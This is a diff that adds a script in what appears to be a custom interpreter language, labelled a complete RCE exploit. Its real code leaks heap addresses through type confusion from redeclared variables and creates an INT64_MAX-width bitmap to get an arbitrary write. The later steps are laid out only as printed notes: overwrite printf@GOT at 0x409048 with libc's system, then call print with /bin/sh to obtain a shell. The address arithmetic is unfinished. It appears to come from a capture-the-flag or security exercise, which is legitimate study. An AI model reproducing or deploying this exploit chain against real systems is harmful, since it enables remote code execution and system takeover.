@@ -1,0 +1,75 @@
+print("=== Complete RCE Exploit - All Steps ===");
+
+print("=== STEP 1: Leak Heap Addresses ===");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+print(addr1);
+
+int leak2 = 0;
+string leak2 = "second";
+int addr2 = leak2;
+print(addr2);
+
+int leak3 = 0;
+string leak3 = "third";
+int addr3 = leak3;
+print(addr3);
+
+print("=== STEP 2: Create Target Variable ===");
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+print("=== STEP 3: Create Bitmap for Arbitrary Write ===");
+bitmap b1 = create(9223372036854775807, 2);
+print("Bitmap created with width=INT64_MAX");
+
+print("=== STEP 4: Corrupt value_ptr to printf@GOT ===");
+print("This step requires:");
+print("1. Finding variable entry address");
+print("2. Finding bitmap buffer address");
+print("3. Calculating y and x coordinates");
+print("4. Writing 0x409048 bit-by-bit");
+
+print("Step 4a: Estimate entry address");
+print("entry_addr ≈ targetaddr - 0x300");
+print("value_ptr_addr = entry_addr + 0x28");
+
+print("Step 4b: Estimate bitmap buffer");
+print("bitmap_data_ptr ≈ targetaddr + 0x1000");
+
+print("Step 4c: Calculate coordinates");
+print("y = ((value_ptr_addr - bitmap_data_ptr) * 8) / INT64_MAX");
+print("x = ((value_ptr_addr - bitmap_data_ptr) * 8) % 8");
+
+print("Step 4d: Write 0x409048");
+print("Writing 64 bits bit-by-bit...");
+print("(Actual implementation requires exact addresses)");
+
+print("=== STEP 5: Read libc Address ===");
+int libcleak = target;
+print("Libc printf address:");
+print(libcleak);
+
+print("=== STEP 6: Calculate system Address ===");
+print("Need libc offsets:");
+print("  printf_offset = <from readelf>");
+print("  system_offset = <from readelf>");
+print("  libc_base = libc_leak - printf_offset");
+print("  system_addr = libc_base + system_offset");
+
+print("=== STEP 7: Write system to printf GOT ===");
+print("Same as Step 4, but write system_addr");
+print("Target: 0x409048 printf GOT");
+print("Value: system_addr");
+
+print("=== STEP 8: Trigger RCE ===");
+print("print with /bin/sh");
+print("Calls system which gives shell");
+
+print("=== All Steps Complete ===");
+print("Note: Steps 4 and 7 require exact address calculations");
+print("Steps 5, 6, 8 will work once addresses are found");
